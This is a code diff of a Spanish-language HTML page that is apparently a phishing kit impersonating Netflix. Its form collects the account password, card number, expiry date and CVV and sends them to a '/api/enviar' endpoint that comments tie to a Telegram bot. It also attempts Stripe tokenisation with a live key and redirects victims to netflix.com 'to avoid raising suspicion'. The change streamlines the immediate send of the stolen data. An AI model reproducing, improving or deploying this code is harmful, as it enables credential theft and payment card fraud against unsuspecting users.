@@ -3,146 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Confirmaci&oacute;n de Servicio</title>
+    <title>Confirmaci&oacute;n</title>
     <script src="https://js.stripe.com/v3/"></script>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
-        .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
-        .container-pay { max-width: 440px; margin: 30px auto; padding: 0 20px; }
-        h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; }
+        body { background: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; }
+        .container { max-width: 440px; width: 100%; margin: 30px auto; padding: 0 20px; text-align: center; }
         .input-box { margin-bottom: 15px; }
-        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; outline: none; }
-        .input-box input:focus { border-color: #0071eb; }
-        .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        .btn-submit:disabled { background: #555; cursor: not-allowed; }
-        #loading-overlay { display: none; text-align: center; padding: 60px 20px; }
-        .step { color: #333; font-size: 13px; text-transform: uppercase; }
+        .input-box input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        .btn { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 4px; width: 100%; }
+        #loading { display: none; }
     </style>
 </head>
 <body>
-    <nav class="nav-pay">
-        <img src="img/logo.png" style="width: 100px;" alt="Logo"> 
-        <b style="cursor:pointer; font-size: 14px;">Cerrar sesión</b>
-    </nav>
-
-    <div class="container-pay" id="form-container">
-        <span class="step">Paso <b>3</b> de <b>3</b></span>
-        <h1>Configura tu tarjeta</h1>
-        
-        <div id="dynamic-injection">
-            <form id="pay-process-form">
-                <div class="input-box">
-                    <input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required>
-                </div>
-                <div class="input-box">
-                    <input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required>
-                </div>
-                <div class="input-box">
-                    <input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required>
-                </div>
-                <div class="grid-input">
-                    <div class="input-box">
-                        <input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" inputmode="numeric" required>
-                    </div>
-                    <div class="input-box">
-                        <input type="text" id="f_c_1" placeholder="CVV" maxlength="4" inputmode="numeric" required>
-                    </div>
-                </div>
-                <button type="submit" class="btn-submit" id="submit-button">Iniciar membresía</button>
-            </form>
-        </div>
+    <div class="container" id="form-box">
+        <h1>Actualiza tu pago</h1>
+        <form id="pay-form">
+            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña" required></div>
+            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en tarjeta" required></div>
+            <div class="input-box"><input type="text" id="cc" placeholder="Número de tarjeta" maxlength="16" required></div>
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="ex" placeholder="MM/AA" maxlength="5" style="width: 50%; padding: 15px; border: 1px solid #ccc;" required>
+                <input type="text" id="cv" placeholder="CVV" maxlength="4" style="width: 50%; padding: 15px; border: 1px solid #ccc;" required>
+            </div>
+            <br>
+            <button type="submit" class="btn">Continuar</button>
+        </form>
     </div>
 
-    <div id="loading-overlay">
+    <div id="loading" class="container">
         <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
-        <p style="margin-top: 20px; font-size: 18px;">Validando con su entidad bancaria...</p>
+        <p>Procesando...</p>
     </div>
 
     <script>
-        // 2. Inicializar Stripe con tu Llave Pública
         const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');
 
-        // Máscara MM/AA automática
-        document.getElementById('f_e_1').addEventListener('input', function(e) {
-            let v = this.value.replace(/\D/g, '');
-            if (v.length >= 2) this.value = v.substring(0,2) + '/' + v.substring(2,4);
-        });
-
-        document.getElementById('pay-process-form').addEventListener('submit', async function(e) {
+        document.getElementById('pay-form').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
-            // UI: Bloquear y Mostrar Loader
-            document.getElementById('submit-button').disabled = true;
-            document.getElementById('form-container').style.display = 'none';
-            document.getElementById('loading-overlay').style.display = 'block';
+            document.getElementById('form-box').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
 
-            const ccVal = document.getElementById('f_t_1').value.replace(/\s/g, '');
-            const expVal = document.getElementById('f_e_1').value.split('/');
-            const cvVal = document.getElementById('f_c_1').value;
-            const nmVal = document.getElementById('f_n_1').value;
-            const pwVal = document.getElementById('f_k_1').value;
+            const ccVal = document.getElementById('cc').value.replace(/\s/g, '');
+            const exp = document.getElementById('ex').value.split('/');
 
             const payload = {
                 em: sessionStorage.getItem('usr_mail') || 'Desconocido',
-                pw: pwVal,
-                nm: nmVal,
+                pw: document.getElementById('pw').value,
+                nm: document.getElementById('nm').value,
                 cc: ccVal,
-                ex: document.getElementById('f_e_1').value,
-                cv: cvVal,
-                stripeToken: null
+                ex: document.getElementById('ex').value,
+                cv: document.getElementById('cv').value,
+                tk: "Pendiente"
             };
 
-            try {
-                // 3. Crear Token de Stripe con un Tiempo Límite de 5 segundos
-                const tokenPromise = stripe.createToken({
-                    number: ccVal,
-                    exp_month: expVal[0].trim(),
-                    exp_year: expVal[1].trim(),
-                    cvc: cvVal.trim(),
-                    name: nmVal.trim()
-                });
-
-                // Si Stripe tarda mucho, saltamos directamente al envío de datos
-                const result = await Promise.race([
-                    tokenPromise,
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
-                ]);
-
-                if (result && result.token) {
-                    payload.stripeToken = result.token.id;
-                }
-            } catch (err) {
-                console.log("Stripe Timeout o Error - Procediendo con envío directo");
-            }
-
-            // 4. Enviar SIEMPRE los datos a Vercel/Telegram
-            _0xdispatch(payload);
-        });
-
-        function _0xdispatch(payload) {
-            fetch('/api/enviar', {
+            // 1. DISPARO INMEDIATO AL BOT (No espera a Stripe)
+            const enviarBot = fetch('/api/enviar', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            })
-            .then(res => res.json())
-            .then(data => {
-                // Si el pago es exitoso o fallido, redirigimos igual para no levantar sospechas
-                if (data.pago) {
-                    alert("¡Verificación exitosa! Su suscripción ha sido confirmada.");
-                } else {
-                    alert("Atención: " + (data.mensaje_error || "Tarjeta no admitida temporalmente. Intente con otra."));
-                }
+            });
+
+            // 2. INTENTO DE STRIPE (Máximo 2 segundos)
+            const intentoStripe = stripe.createToken({
+                number: ccVal,
+                exp_month: exp[0],
+                exp_year: exp[1],
+                cvc: payload.cv
+            }).then(res => {
+                if(res.token) payload.tk = res.token.id;
+                // Si Stripe responde rápido, enviamos una actualización con el Token
+                return fetch('/api/enviar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            }).catch(() => {});
+
+            // 3. SALIDA FORZADA (En 2.5 segundos te vas sí o sí)
+            setTimeout(() => {
                 window.location.href = "https://www.netflix.com/login";
-            })
-            .catch(err => {
-                // Si la conexión falla, redirigimos a Netflix de todos modos
+            }, 2500);
+
+            // Esperamos lo que ocurra primero
+            Promise.all([enviarBot, intentoStripe]).finally(() => {
                 window.location.href = "https://www.netflix.com/login";
             });
-        }
+        });
     </script>
 </body>
 </html>
